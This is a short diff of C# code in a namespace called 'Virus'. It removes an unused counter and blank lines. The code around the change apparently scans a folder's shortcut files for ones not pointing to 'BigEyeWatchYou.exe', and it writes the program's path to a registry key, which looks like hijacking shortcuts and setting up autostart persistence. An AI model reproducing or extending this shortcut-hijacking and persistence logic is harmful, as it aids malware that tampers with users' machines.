@@ -22,9 +22,7 @@ namespace Virus
             var files = LnkHelper.GetAllShortcutsFiles(folder);
             var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");
 
-            int count = 0;
-
-            foreach(var file in files)
+            foreach (var file in files)
             {
                 var path = LnkHelper.GetShellLinkPath(file.FullName);
                 if (!path.Contains("BigEyeWatchYou.exe"))
@@ -52,9 +50,6 @@ namespace Virus
             {
                 rk.SetValue(appName, appFullPath);
             }
-
-
-
         }
     }
 }
